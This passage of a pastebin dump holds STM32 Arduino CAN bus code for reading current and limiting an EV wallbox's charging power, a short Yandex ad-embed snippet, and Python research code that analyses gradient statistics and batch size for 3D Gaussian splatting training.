	if ((id & STM32_CAN_RIR_IDE) == 0) { // Standard frame format
			CAN_rx_msg->format = STANDARD_FORMAT;;
			CAN_rx_msg->id = (CAN_STD_ID_MASK & (id >> 21U));
	} 
	else {                               // Extended frame format
			CAN_rx_msg->format = EXTENDED_FORMAT;;
			CAN_rx_msg->id = (CAN_EXT_ID_MASK & (id >> 3U));
	}

	if ((id & STM32_CAN_RIR_RTR) == 0) { // Data frame
			CAN_rx_msg->type = DATA_FRAME;
	}
	else {                               // Remote frame
			CAN_rx_msg->type = REMOTE_FRAME;
	}

	
	CAN_rx_msg->len = (CAN1->sFIFOMailBox[0].RDTR) & 0xFUL;
	
	CAN_rx_msg->data[0] = 0xFFUL &  CAN1->sFIFOMailBox[0].RDLR;
	CAN_rx_msg->data[1] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDLR >> 8);
	CAN_rx_msg->data[2] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDLR >> 16);
	CAN_rx_msg->data[3] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDLR >> 24);
	CAN_rx_msg->data[4] = 0xFFUL &  CAN1->sFIFOMailBox[0].RDHR;
	CAN_rx_msg->data[5] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDHR >> 8);
	CAN_rx_msg->data[6] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDHR >> 16);
	CAN_rx_msg->data[7] = 0xFFUL & (CAN1->sFIFOMailBox[0].RDHR >> 24);

	// Release FIFO 0 output mailbox.
	// Make the next incoming message available.
	CAN1->RF0R |= 0x20UL;
}

/**
 * Encodes CAN messages using the CAN message struct and populates the 
 * data registers with the sent.
 * 
 * @params CAN_tx_msg - CAN message structure for transmission
 * 
 */
void CANSend(CAN_msg_t* CAN_tx_msg)
{
	volatile int count = 0;

	uint32_t out = 0;
	if (CAN_tx_msg->format == EXTENDED_FORMAT) { // Extended frame format
			out = ((CAN_tx_msg->id & CAN_EXT_ID_MASK) << 3U) | STM32_CAN_TIR_IDE;
	}
	else {                                       // Standard frame format
			out = ((CAN_tx_msg->id & CAN_STD_ID_MASK) << 21U);
	}

	// Remote frame
	if (CAN_tx_msg->type == REMOTE_FRAME) {
			out |= STM32_CAN_TIR_RTR;
	}

	CAN1->sTxMailBox[0].TDTR &= ~(0xF);
	CAN1->sTxMailBox[0].TDTR |= CAN_tx_msg->len & 0xFUL;
	
	CAN1->sTxMailBox[0].TDLR  = (((uint32_t) CAN_tx_msg->data[3] << 24) |
															((uint32_t) CAN_tx_msg->data[2] << 16) |
															((uint32_t) CAN_tx_msg->data[1] <<  8) |
															((uint32_t) CAN_tx_msg->data[0]      ));
	CAN1->sTxMailBox[0].TDHR  = (((uint32_t) CAN_tx_msg->data[7] << 24) |
															((uint32_t) CAN_tx_msg->data[6] << 16) |
															((uint32_t) CAN_tx_msg->data[5] <<  8) |
															((uint32_t) CAN_tx_msg->data[4]      ));

	// Send Go
	CAN1->sTxMailBox[0].TIR = out | STM32_CAN_TIR_TXRQ;

	// Wait until the mailbox is empty
	while(CAN1->sTxMailBox[0].TIR & 0x1UL && count++ < 1000000);

	// The mailbox don't becomes empty while loop
	if (CAN1->sTxMailBox[0].TIR & 0x1UL) {
		Serial.println(""Send Fail"");
		Serial.print("" CAN1->ESR "");Serial.print(CAN1->ESR);
		Serial.print("" CAN1->MSR "");Serial.print(CAN1->MSR);
		Serial.print("" CAN1->TSR "");Serial.print(CAN1->TSR);
		Serial.println();
		if (CAN1->TSR & CAN_TSR_RQCP0) {Serial.println("" ERR CAN_TSR_RQCP0"");}
		if (CAN1->TSR & CAN_TSR_TXOK0) {Serial.println("" ERR CAN_TSR_TXOK0"");}
		if (CAN1->TSR & CAN_TSR_ALST0) {Serial.println("" ERR CAN_TSR_ALST0"");}
		if (CAN1->TSR & CAN_TSR_TERR0) {Serial.println("" ERR CAN_TSR_TERR0"");}
		if (CAN1->TSR & CAN_TSR_ABRQ0) {Serial.println("" ERR CAN_TSR_ABRQ0"");}
		if (CAN1->TSR & CAN_TSR_RQCP1) {Serial.println("" ERR CAN_TSR_RQCP1"");}
		if (CAN1->TSR & CAN_TSR_TXOK1) {Serial.println("" ERR CAN_TSR_TXOK1"");}
		if (CAN1->TSR & CAN_TSR_ALST1) {Serial.println("" ERR CAN_TSR_ALST1"");}
		if (CAN1->TSR & CAN_TSR_TERR1) {Serial.println("" ERR CAN_TSR_TERR1"");}
		if (CAN1->TSR & CAN_TSR_ABRQ1) {Serial.println("" ERR CAN_TSR_ABRQ1"");}
		if (CAN1->TSR & CAN_TSR_RQCP2) {Serial.println("" ERR CAN_TSR_RQCP2"");}
		if (CAN1->TSR & CAN_TSR_TXOK2) {Serial.println("" ERR CAN_TSR_TXOK2"");}
		if (CAN1->TSR & CAN_TSR_ALST2) {Serial.println("" ERR CAN_TSR_ALST2"");}
		if (CAN1->TSR & CAN_TSR_TERR2) {Serial.println("" ERR CAN_TSR_TERR2"");}
		if (CAN1->TSR & CAN_TSR_ABRQ2) {Serial.println("" ERR CAN_TSR_ABRQ2"");}
		if (CAN1->TSR & CAN_TSR_CODE) {Serial.println("" ERR CAN_TSR_CODE"");}
		if (CAN1->TSR & CAN_TSR_TME) {Serial.println("" ERR CAN_TSR_TME"");}
		if (CAN1->TSR & CAN_TSR_TME0) {Serial.println("" ERR CAN_TSR_TME0"");}
		if (CAN1->TSR & CAN_TSR_TME1) {Serial.println("" ERR CAN_TSR_TME1"");}
		if (CAN1->TSR & CAN_TSR_TME2) {Serial.println("" ERR CAN_TSR_TME2"");}
		if (CAN1->TSR & CAN_TSR_LOW) {Serial.println("" ERR CAN_TSR_LOW"");}
		if (CAN1->TSR & CAN_TSR_LOW0) {Serial.println("" ERR CAN_TSR_LOW0"");}
		if (CAN1->TSR & CAN_TSR_LOW1) {Serial.println("" ERR CAN_TSR_LOW1"");}
		if (CAN1->TSR & CAN_TSR_LOW2) {Serial.println("" ERR CAN_TSR_LOW2"");}

	}else {
		Serial.println(""Send OK"");
	}
}

/**
 * Returns whether there are CAN messages available.
 *
 * @returns If pending CAN messages are in the CAN controller
 *
 */
uint8_t CANMsgAvail(void)
{
	// Check for pending FIFO 0 messages
	return CAN1->RF0R & 0x3UL;
}
/******************************************************************************
************************ CANBUS FUNCTIONS END *********************************
******************************************************************************/ 


//-------------------------------------------------------------------------------------
//--------------------------- PROGRAM START -------------------------------------------
//-------------------------------------------------------------------------------------
#define INPUT_PIN_POTENTIOMETER      A0
unsigned long previousMillis = 0;
const long interval = 1000;


void readCurrentMode()
{
	CAN_msg_t CAN_RX_msg;

	if(CANMsgAvail()) {
		Serial.println(""Received..."");
		CANReceive(&CAN_RX_msg);

		if (CAN_RX_msg.format == EXTENDED_FORMAT) {
			Serial.print(""Extended ID: 0x"");
			if (CAN_RX_msg.id < 0x10000000) Serial.print(""0"");
			if (CAN_RX_msg.id < 0x1000000) Serial.print(""00"");
			if (CAN_RX_msg.id < 0x100000) Serial.print(""000"");
			if (CAN_RX_msg.id < 0x10000) Serial.print(""0000"");
			Serial.print(CAN_RX_msg.id, HEX);
		} else {
			Serial.print(""Standard ID: 0x"");
			if (CAN_RX_msg.id < 0x100) Serial.print(""0"");
			if (CAN_RX_msg.id < 0x10) Serial.print(""00"");
			Serial.print(CAN_RX_msg.id, HEX);
			Serial.print(""     "");
		}

		Serial.print("" DLC: "");
		Serial.print(CAN_RX_msg.len);
		if (CAN_RX_msg.type == DATA_FRAME) {
			Serial.print("" Data: "");
			for(int i=0; i<CAN_RX_msg.len; i++) {
				Serial.print(""0x""); 
				Serial.print(CAN_RX_msg.data[i], HEX); 
				if (i != (CAN_RX_msg.len-1))  Serial.print("" "");
			}
			Serial.println();

			int16_t c1 = 0, c2 = 0, c3 = 0;
			c1 = CAN_RX_msg.data[0] | (CAN_RX_msg.data[1] << 8);
			c2 = CAN_RX_msg.data[2] | (CAN_RX_msg.data[3] << 8);
			c3 = CAN_RX_msg.data[4] | (CAN_RX_msg.data[5] << 8);
			double L1 = 0, L2 = 0, L3 = 0;
			L1 = ((double)c1 / 10) * 240;
			L2 = ((double)c2 / 10) * 240;
			L3 = ((double)c3 / 10) * 240;
			Serial.print("" C1 "");Serial.print((double)c1 / 10, 1);Serial.print(""A L1 "");Serial.print((double)L1);Serial.println(""W"");
			Serial.print("" C2 "");Serial.print((double)c2 / 10, 1);Serial.print(""A L2 "");Serial.print((double)L2);Serial.println(""W"");
			Serial.print("" C3 "");Serial.print((double)c3 / 10, 1);Serial.print(""A L3 "");Serial.print((double)L3);Serial.println(""W"");
			Serial.println();
		} else {
			Serial.println("" Data: REMOTE REQUEST FRAME"");
		}
	}
}


void wallboxLimitPowerMode()
{
	unsigned long currentMillis = millis();
	if (currentMillis - previousMillis >= interval) {
		previousMillis = currentMillis;
		Serial.println(""\nWallboxLimitPowerMode..."");
		
		int val = analogRead(INPUT_PIN_POTENTIOMETER);
		Serial.print(""  potentiometer: "");Serial.print(val);
		Serial.println();
		double v = (double)val / 1024;
		Serial.print(""  v: "");Serial.print(v, 1);
		Serial.println();

		double current = v * 32; // 32A is max
		Serial.print(""  current: "");Serial.print(current, 1);Serial.print(""A"");
		Serial.println();

		double power = current * 240;
		Serial.print(""  power: "");Serial.print(power, 1);Serial.print(""W"");
		Serial.println();

		int16_t L1 = current * 10, L2 = current * 10, L3 = current * 10;

		CAN_msg_t CAN_TX_msg;

		CAN_TX_msg.type = DATA_FRAME;
		CAN_TX_msg.format = EXTENDED_FORMAT;
		CAN_TX_msg.id = 0x10045400;

		CAN_TX_msg.data[0] = L1 & ((1 << 8) - 1);
		CAN_TX_msg.data[1] = L1 >> 8;
		CAN_TX_msg.data[2] = L2 & ((1 << 8) - 1);
		CAN_TX_msg.data[3] = L2 >> 8;
		CAN_TX_msg.data[4] = L3 & ((1 << 8) - 1);
		CAN_TX_msg.data[5] = L3 >> 8;
		
		CAN_TX_msg.len = 6;
		Serial.println(""  send..."");
		CANSend(&CAN_TX_msg);
	}
}


void setup() {
	Serial.begin(115200);
	Serial.println(""Start"");

	pinMode(INPUT_PIN_POTENTIOMETER, INPUT_ANALOG);

	CAN_bit_timing_config_t timings;
	const uint32_t peripheral_clock_rate = HAL_RCC_GetPCLK1Freq();
	timings.baud_rate_prescaler = 21;
	timings.time_segment_1 = 13;
	timings.time_segment_2 = 2;
	timings.resynchronization_jump_width = 1;

	Serial.print(""peripheral_clock_rate=""); Serial.println(peripheral_clock_rate);

	Serial.print(""timings.baud_rate_prescaler=""); Serial.println(timings.baud_rate_prescaler);
	Serial.print(""timings.time_segment_1=""); Serial.println(timings.time_segment_1);
	Serial.print(""timings.time_segment_2=""); Serial.println(timings.time_segment_2);
	Serial.print(""timings.resynchronization_jump_width=""); Serial.println(timings.resynchronization_jump_width);

	double computed_bitrate = 1 / (1 / (double)peripheral_clock_rate * timings.baud_rate_prescaler * (timings.time_segment_1 + timings.time_segment_2 + timings.resynchronization_jump_width));
	Serial.print(""computed_bitrate=""); Serial.println(computed_bitrate, 3);

	bool ret = CANInit(timings, 2);  // CAN_RX mapped to PB8, CAN_TX mapped to PB9
	if (!ret) while(true);
}


void loop() {
	// (un)comment to change mode

	// read house consumption from power guard device
	readCurrentMode(); // <<<<<<--------------

	// simulate house consumption
	//wallboxLimitPowerMode(); // <<<<<<--------------
}
"
uRjZZBpa,[D] Лента - с модификацией колонок,Luxup,JavaScript,Monday 13th of May 2024 05:12:06 AM CDT,"<div id=""yandex_rtb_R-A-2205764-21""></div>
<script>
    window.yaContextCb.push(()=>{
    	Ya.Context.AdvManager.render({
            ""blockId"": ""R-A-2205764-21"",
            ""renderTo"": ""yandex_rtb_R-A-2205764-21"",
            ""type"": ""feed"",
            ""feedCardCount"": 6,
            ""columnCount"": 2
        })
	})
</script>"
afbzc0F8,Untitled,noodleham,Python,Monday 13th of May 2024 05:08:52 AM CDT,"#
# Copyright (C) 2023, Inria
# GRAPHDECO research group, https://team.inria.fr/graphdeco
# All rights reserved.
#
# This software is free for non-commercial, research and evaluation use 
# under the terms of the LICENSE.md file.
#
# For inquiries contact  george.drettakis@inria.fr
#
import copy
import math
import os
import pdb
from collections import defaultdict
from typing import List, Union, Tuple, Dict, Literal
import pprint

import numpy as np
import torch
import random
from random import randint
from utils.loss_utils import l1_loss, ssim
from gaussian_renderer import render, network_gui
import sys
from scene import Scene, GaussianModel
from utils.general_utils import safe_state
import uuid
from tqdm import tqdm
from utils.image_utils import psnr
from argparse import ArgumentParser, Namespace
from arguments import ModelParams, PipelineParams, OptimizationParams

import matplotlib.pyplot as plt
import matplotlib

try:
    from torch.utils.tensorboard import SummaryWriter

    TENSORBOARD_FOUND = True
except ImportError:
    TENSORBOARD_FOUND = False


def get_full_batch_gradients(gaussians: GaussianModel, viewpoint_stack, background, pipe, opt, grad_keys):
    gaussians.optimizer.zero_grad(set_to_none=True)
    for i in range(len(viewpoint_stack)):
        viewpoint_cam = viewpoint_stack[i]
        bg = background
        render_pkg = render(viewpoint_cam, gaussians, pipe, bg)
        image, viewspace_point_tensor, visibility_filter, radii = render_pkg[""render""], render_pkg[""viewspace_points""], \
            render_pkg[""visibility_filter""], render_pkg[""radii""]
        # Loss
        gt_image = viewpoint_cam.original_image.cuda()
        Ll1 = l1_loss(image, gt_image)
        loss = (1.0 - opt.lambda_dssim) * Ll1 + opt.lambda_dssim * (1.0 - ssim(image, gt_image))
        loss.backward()
    ret = {k: getattr(gaussians, k).grad for k in grad_keys}
    gaussians.optimizer.zero_grad(set_to_none=True)
    return ret


def get_grad_stats(gaussians: GaussianModel, viewpoint_stack, background, pipe, opt, grad_keys,
                   sampling: str = ""random"",
                   accum_steps: int = 1, determininstic_index: int = None,
                   monitor_params: Tuple[str, List[int]] = None) -> Tuple[
    torch.Tensor, Dict[str, np.array], Dict[str, np.array], Dict[str, np.array], Dict[str, np.array]]:
    assert sampling in [""random"", ""random_order_whole"", ""nearby"", """"]
    cam_indices = None

    if determininstic_index is not None:
        cam_indices = list(range(determininstic_index, determininstic_index + accum_steps))
    else:
        if sampling == ""random"":
            cam_indices = [randint(0, len(viewpoint_stack) - 1) for _ in range(accum_steps)]
        elif sampling == 'nearby':
            index = randint(0, len(viewpoint_stack) - accum_steps)
            cam_indices = list(range(index, index + accum_steps))
        elif sampling == ""random_order_whole"":
            assert accum_steps == len(viewpoint_stack)
            cam_indices = np.random.permutation(np.arange(len(viewpoint_stack)))
    grad_running_sum = {k: 0 for k in grad_keys}
    sparsities = {k: [] for k in grad_keys}
    variances = {k: [] for k in grad_keys}
    cosines = {k: [] for k in grad_keys}
    SNRs = {k: [] for k in grad_keys}
    target_grad = get_full_batch_gradients(gaussians, viewpoint_stack, background, pipe, opt, grad_keys)

    gaussians.optimizer.zero_grad(set_to_none=True)
    for i, cam_idx in enumerate(cam_indices):
        viewpoint_cam = viewpoint_stack[cam_idx]
        bg = background
        render_pkg = render(viewpoint_cam, gaussians, pipe, bg)
        image, viewspace_point_tensor, visibility_filter, radii = render_pkg[""render""], render_pkg[""viewspace_points""], \
            render_pkg[""visibility_filter""], render_pkg[""radii""]
        # Loss
        gt_image = viewpoint_cam.original_image.cuda()
        Ll1 = l1_loss(image, gt_image)
        loss = (1.0 - opt.lambda_dssim) * Ll1 + opt.lambda_dssim * (1.0 - ssim(image, gt_image))
        loss.backward()

        if monitor_params is not None:
            raise NotImplementedError()
        else:
            for k in grad_keys:
                grad_running_sum[k] += getattr(gaussians, k).grad
                sparsities[k].append(float(get_sparsity(grad_running_sum[k])))
                variances[k].append(float(get_variance(grad_running_sum[k], mean=0).mean()))
                cosines[k].append(float(
                    torch.nn.functional.cosine_similarity(grad_running_sum[k].flatten(), target_grad[k].flatten(),
                                                          dim=0)))
                signal = target_grad[k].flatten() / len(cam_indices)
                sample = grad_running_sum[k].flatten() / (i + 1)
                noise = (sample - signal)
                SNRs[k].append(float(torch.inner(signal, signal) / torch.inner(noise, noise)))
        gaussians.optimizer.zero_grad(set_to_none=True)
    sparsities_np = {k: np.array(v) for k, v in sparsities.items()}
    variances_np = {k: np.array(v) for k, v in variances.items()}
    cosines_np = {k: np.array(v) for k, v in cosines.items()}
    SNRs_np = {k: np.array(v) for k, v in SNRs.items()}
    return grad_running_sum, sparsities_np, variances_np, cosines_np, SNRs_np


def get_sparsity(grad: torch.Tensor) -> torch.Tensor:
    return (grad == 0).sum() / grad.numel()


def get_variance(grad: torch.Tensor, mean) -> torch.Tensor:
    return (grad - mean) ** 2


def restored_gaussians(model_params, dataset, opt, deepcopy=False) -> GaussianModel:
    if deepcopy:
        model_params = copy.deepcopy(model_params)
    gaussians = GaussianModel(dataset.sh_degree)
    gaussians.training_setup(opt)
    gaussians.restore(model_params, opt)
    return gaussians


def fill_subplot(ax, title, xs, ys, xlabel, ylabel, xscale='linear', legend_labels: Union[str, List[str]] = """"):
    if isinstance(ys[0], list):
        for i in range(len(ys)):
            if isinstance(xs[0], list):
                ax.plot(xs[i], ys[i], label=legend_labels[i].replace('_', ''), marker='.')
            else:
                ax.plot(xs, ys[i], label=legend_labels[i].replace('_', ''), marker='.')
    else:
        ax.plot(xs, ys, label=legend_labels.replace('_', ''), marker='.')
    ax.set_title(title)
    ax.set_xlabel(xlabel)
    ax.set_xscale(xscale)
    # if xscale == 'log':
    #     ax.set_xticks(xs)
    #     ax.get_xaxis().set_major_formatter(matplotlib.ticker.ScalarFormatter())
    ax.set_ylabel(ylabel)
    if legend_labels != '':
        ax.legend()


def plot_histogram(grads, num_bins=1000):
    counts, bins = torch.histogram(grads, bins=num_bins)
    plt.hist(bins[:-1], bins, weights=counts)
    # plt.yscale('symlog')
    plt.ylim((0, counts.max()))
    plt.show()
    plt.close()


def plot_covariance(cov, to_plot: List[int], sqrt=True):
    if len(to_plot) >= 4:
        nrows, ncols = 2, math.ceil(len(to_plot) / 2)
    else:
        nrows, ncols = 1, len(to_plot)
    fig, axes = plt.subplots(nrows, ncols, figsize=(6 * ncols, 6 * nrows + 2), dpi=200)
    for i, ax in enumerate(fig.axes):
        if i > len(to_plot):
            break
        if sqrt:
            ax.imshow(torch.sqrt(torch.abs(cov[to_plot[i]])), cmap='gray')
            ax.set_title(f'sqrt(covariance) for parameter {to_plot[i]}')
        else:
            ax.imshow(torch.abs(cov[to_plot[i]]), cmap='gray')
            ax.set_title(f'covariance for parameter {to_plot[i]}')
        ax.set_xlabel('view #')
        ax.set_ylabel('view #')
    plt.suptitle('Grad covariance by view')
    plt.show()
    plt.close()


def get_variance_sparsity_cosine_SNR(gaussians, train_cameras, background, pipe, opt, keys, num_trials, accum_steps):
    sparsities = {k: 0 for k in keys}
    variances = {k: 0 for k in keys}
    cosines = {k: 0 for k in keys}
    SNRs = {k: 0 for k in keys}
    for trial in range(num_trials):
        grads_runing_sum, s, v, c, snrs = get_grad_stats(gaussians, train_cameras, background, pipe, opt, keys,
                                                         sampling=""random_order_whole"", accum_steps=accum_steps)
        # grads_runing_sum, s, v, c = get_grad_stats(gaussians, train_cameras, background, pipe, opt, keys,
        #                                         sampling="""", accum_steps=accum_steps, determininstic_index=0)
        for k in keys:
            sparsities[k] += s[k] / num_trials
            variances[k] += v[k] / num_trials
            cosines[k] += c[k] / num_trials
            SNRs[k] += snrs[k] / num_trials
    return variances, sparsities, cosines, SNRs


def plot_variance_sparsity_cosine(dataset, opt, train_cameras, background, pipe, checkpoint, keys, num_trials=32,
                                  iters_list=[15000, 30000]):
    accum_steps = len(train_cameras)
    random.seed()
    variances: List[Dict[str: np.array]] = []
    sparsities: List[Dict[str: np.array]] = []
    cosines: List[Dict[str: np.array]] = []
    SNRs: List[Dict[str: np.array]] = []
    for iter in iters_list:
        chpt = checkpoint.rstrip("".pth"").split(""chkpnt"")[1]
        print('loading checkpoint ', checkpoint.replace(""chkpnt"" + str(chpt), ""chkpnt"" + str(iter)))
        (model_params, first_iter) = torch.load(checkpoint.replace(""chkpnt"" + str(chpt), ""chkpnt"" + str(iter)))
        gaussians = restored_gaussians(model_params, dataset, opt)
        v, s, c, snrs = get_variance_sparsity_cosine_SNR(gaussians, train_cameras, background, pipe, opt, keys,
                                                         num_trials, accum_steps)
        variances.append(v)
        sparsities.append(s)
        cosines.append(c)
        SNRs.append(snrs)

    scene_name = os.path.basename(args.source_path)
    for k in keys:
        fig, ax = plt.subplots(1, 5, figsize=(6 * 5, 6))
        for i, iter in enumerate(iters_list):
            fill_subplot(ax[0], 'Batch size vs Grad Sparsity', np.arange(accum_steps),
                         sparsities[i][k],
                         'Batch size', 'Sparsity', xscale='log', legend_labels='iter ' + str(iter))
            fill_subplot(ax[1], 'Batch size vs Grad Variance', np.arange(accum_steps),
                         variances[i][k],
                         'Batch size', 'Avg Parameter Variance', xscale='linear', legend_labels='iter ' + str(iter))
            fill_subplot(ax[2], 'Batch size vs Cosine Sim. with Full-Batch Grad', np.arange(accum_steps),
                         cosines[i][k],
                         'Batch size', 'Cosine Similarity', xscale='linear', legend_labels='iter ' + str(iter))
            # Ignore the last value because full-batch SNR is infinite
            fill_subplot(ax[3], 'Batch size vs grad SNR', np.arange(accum_steps)[:-10],
                         SNRs[i][k][:-10],
                         'Batch size', 'SNR', xscale='linear', legend_labels='iter ' + str(iter))
            # Ignore the last value because full-batch SNR is infinite
            fill_subplot(ax[4], 'Batch size vs grad NSR', np.arange(accum_steps)[:-10],
                         1 / SNRs[i][k][:-10],
                         'Batch size', 'NSR', xscale='linear', legend_labels='iter ' + str(iter))
        fig.suptitle(f'Scene: {scene_name}. Param group: {k.replace(""_"", """")}')
        fig.tight_layout()
        os.makedirs(os.path.join('plots', scene_name), exist_ok=True)
        fig.savefig(os.path.join('plots', scene_name,
                                 f'scene_{scene_name}_param_{k.replace(""_"", """")}_random_order_trials_{num_trials}_snr.png'))
        fig.show()
        plt.close(fig)


def backward_once(gaussians: GaussianModel, viewpoint_cam, opt, pipe, background):
    render_pkg = render(viewpoint_cam, gaussians, pipe, background)
    image, viewspace_point_tensor, visibility_filter, radii = render_pkg[""render""], render_pkg[
        ""viewspace_points""], \
        render_pkg[""visibility_filter""], render_pkg[""radii""]
    # Loss
    gt_image = viewpoint_cam.original_image
    Ll1 = l1_loss(image, gt_image)
    loss = (1.0 - opt.lambda_dssim) * Ll1 + opt.lambda_dssim * (1.0 - ssim(image, gt_image))
    loss.backward()
    return loss


def run_iterations(gaussians: GaussianModel, train_cameras, opt, camera_ids, batch_size, pipe, background,
                   discard_last=True):
    gaussians.optimizer.zero_grad(set_to_none=True)
    for i, camera_id in enumerate(camera_ids):
        backward_once(gaussians, train_cameras[camera_id], opt, pipe, background)

        # Update params every batch_size iterations
        if (i + 1) % batch_size == 0:
            gaussians.optimizer.step()
            gaussians.optimizer.zero_grad(set_to_none=True)
        elif not discard_last and i == len(camera_ids) - 1:
            gaussians.optimizer.step()
            gaussians.optimizer.zero_grad(set_to_none=True)
    gaussians.optimizer.zero_grad(set_to_none=True)
    return gaussians


def clear_adam_state(optimizer, bach_size, rescale_betas=True,
                     lr_scaling: Literal['constant', 'sqrt', 'linear'] = 'sqrt'):
    for group in optimizer.param_groups:
        # clear ADAM state
        if rescale_betas:
            group['betas'] = (group['betas'][0] ** bach_size, group['betas'][1] ** bach_size)
        for p in group['params']:
            state = optimizer.state[p]
            state['exp_avg'] *= 0
            state['exp_avg_sq'] *= 0
            state['step'] *= 0
        if lr_scaling == 'constant':
            coeff = 1
        elif lr_scaling == 'sqrt':
            coeff = float(bach_size) ** 0.5
        elif lr_scaling == 'linear':
            coeff = float(bach_size)
        else:
            raise ValueError(f'Unknown lr_scaling {lr_scaling}')
        group['lr'] *= coeff


def plot_batch_size_vs_weights_delta_similarity(dataset, opt, train_cameras, background, pipe, checkpoint_path, keys,
                                                num_trials=32,
                                                checkpoints_list=[15000, 30000],
                                                batch_sizes=[1, 4, 16, 64], warmup_epochs=1, run_epochs=5,
                                                rescale_betas=True,
                                                lr_scaling: Literal['constant', 'sqrt', 'linear'] = 'sqrt'):
    random.seed()
    cosines_for_checkpoint = []
    norms_for_checkpoint = []
    losses_for_checkpoint = []
    param_index_map = {'_xyz': 1, '_features_dc': 2, '_features_rest': 3, '_scaling': 4, '_rotation': 5, '_opacity': 6}

    for checkpoint_itr in checkpoints_list:
        cosines: Dict[str, List[Dict[int, float]]] = {k: [{} for _ in range(len(batch_sizes))] for k in keys}
        norms: Dict[str, List[Dict[int, float]]] = {k: [{} for _ in range(len(batch_sizes))] for k in keys}
        losses: List[Dict[int, float]] = [defaultdict(float) for _ in range(len(batch_sizes))]
        chpt = checkpoint_path.rstrip("".pth"").split(""chkpnt"")[1]
        cur_checkpoint = checkpoint_path.replace(""chkpnt"" + str(chpt), ""chkpnt"" + str(checkpoint_itr))
        print('loading checkpoint ', cur_checkpoint)
        (model_params, first_iter) = torch.load(cur_checkpoint)

        # original_gaussians = restored_gaussians(model_params, opt)
        original_params = {k: model_params[param_index_map[k]] for k in keys}
        camera_idx = np.concatenate(
            [np.random.permutation(np.arange(len(train_cameras))) for _ in range(warmup_epochs + run_epochs)])

        for batch_size in batch_sizes:
            if batch_size == 1:
                continue
            print('Running for batch size', batch_size)
            temp_batch_sizes = [1, batch_size]
            running_gaussians = [restored_gaussians(model_params, dataset, opt, deepcopy=True) for _ in
                                 temp_batch_sizes]
            # Readjust ADAM parameters for batch size > 1
            for i in range(len(temp_batch_sizes)):
                clear_adam_state(running_gaussians[i].optimizer, temp_batch_sizes[i], rescale_betas=rescale_betas,
                                 lr_scaling=lr_scaling)
                # warmup new ADAM state
                run_iterations(running_gaussians[i], train_cameras, opt,
                               camera_idx[:len(train_cameras) * warmup_epochs], temp_batch_sizes[i], pipe, background,
                               discard_last=True)
                running_gaussians[i].restore_parameters(model_params, opt)

            for i, camera_id in enumerate(tqdm(camera_idx[len(train_cameras) * warmup_epochs:])):
                for j, temp_batch_size in enumerate(temp_batch_sizes):
                    running_gaussian = running_gaussians[j]
                    loss = backward_once(running_gaussian, train_cameras[camera_id], opt, pipe, background)

                    # average gradients from views
                    next_accum_step = min(len(camera_idx), (i // temp_batch_size + 1) * temp_batch_size)
                    last_accum_step = (i // temp_batch_size) * temp_batch_size
                    # loss /= min(temp_batch_size, len(train_cameras) - last_accum_step)
                    # loss /= temp_batch_size

                    # print('batch size ', temp_batch_size, 'next accum step', next_accum_step, 'divider', min(temp_batch_size, len(train_cameras) - last_accum_step))
                    if temp_batch_size == 1:
                        losses[batch_sizes.index(temp_batch_size)][next_accum_step] = float(
                            loss.item()) / temp_batch_size
                    else:
                        losses[batch_sizes.index(temp_batch_size)][next_accum_step] += float(
                            loss.item()) / temp_batch_size
                    # Update params every batch_size iterations
                    # if (i + 1) % temp_batch_size == 0 or i == len(camera_idx) - 1:
                    if (i + 1) % temp_batch_size == 0:
                        running_gaussian.optimizer.step()
                        running_gaussian.optimizer.zero_grad(set_to_none=True)
                        for k in keys:
                            # compare weight delta from batch-size 1 and that from the current batch-size
                            weight_delta = getattr(running_gaussian, k).detach() - original_params[k]
                            norms[k][batch_sizes.index(temp_batch_size)][i + 1] = float(torch.linalg.norm(weight_delta))
                            if temp_batch_size != 1:
                                reference_weight_delta = getattr(running_gaussians[0], k).detach() - original_params[k]
                                cosines[k][batch_sizes.index(temp_batch_size)][i + 1] = float(
                                    torch.nn.functional.cosine_similarity(reference_weight_delta.flatten(),
                                                                          weight_delta.flatten(), dim=0))
            del running_gaussians, running_gaussian, weight_delta, reference_weight_delta, loss
        cosines_for_checkpoint.append(cosines)
        losses_for_checkpoint.append(losses)
        norms_for_checkpoint.append(norms)
        del model_params, first_iter, original_params
    pprint.pp(losses_for_checkpoint)
    pprint.pp(norms_for_checkpoint)
    pprint.pp(cosines_for_checkpoint)
    return cosines_for_checkpoint, losses_for_checkpoint, norms_for_checkpoint


def plot(cosines, losses, norms, keys, checkpoint_iter, batch_sizes, rescale_betas: bool, lr_scaling: str, warmup_epochs: int):
    scene_name = os.path.basename(args.source_path)
    for k in keys:
        fig, ax = plt.subplots(1, 3, figsize=(6 * 3, 6), dpi=200)
        fill_subplot(ax[0], 'Batch size vs cosine(weight delta w.r.t bs=1)',
                     [list(cosines[k][j].keys()) for j in range(len(batch_sizes))],
                     [list(cosines[k][j].values()) for j in range(len(batch_sizes))],
                     'Iterations', 'Cosine Sim', xscale='linear', legend_labels=[f'BS {b}' for b in batch_sizes])
        fill_subplot(ax[1], 'Batch size vs Loss',
                     [list(losses[j].keys()) for j in range(len(batch_sizes))],
                     [list(losses[j].values()) for j in range(len(batch_sizes))],
                     'Iterations', 'loss', xscale='linear', legend_labels=[f'BS {b}' for b in batch_sizes])
        fill_subplot(ax[2], 'Batch size vs norm(weight delta)',
                     [list(norms[k][j].keys()) for j in range(len(batch_sizes))],
                     [list(norms[k][j].values()) for j in range(len(batch_sizes))],
                     'Iterations', 'norm', xscale='linear', legend_labels=[f'BS {b}' for b in batch_sizes])

        fig.suptitle(f'Scene: {scene_name}. Checkpoint {checkpoint_iter}. Rescale betas: {rescale_betas}. LR scaling: {lr_scaling}. Warmup: {warmup_epochs} epochs. Params: {k}')
        fig.tight_layout()
        os.makedirs(os.path.join('plots_grad_delta', scene_name), exist_ok=True)
        fig.savefig(os.path.join('plots_grad_delta', scene_name,
                                 f'scene_{scene_name}_checkpoint_{checkpoint_iter}_param_{k.replace(""_"", """")}_rescale_betas_{rescale_betas}_lr_{lr_scaling}_warmup_{warmup_epochs}.png'))
        if k == '_xyz':
            fig.show()
        plt.close(fig)


def training(dataset, opt, pipe, testing_iterations, saving_iterations, checkpoint_iterations, checkpoint, debug_from):
    first_iter = 0
    tb_writer = prepare_output_and_logger(dataset)
    scene = Scene(dataset, None)
    # if checkpoint:
    #     (model_params, first_iter) = torch.load(checkpoint)
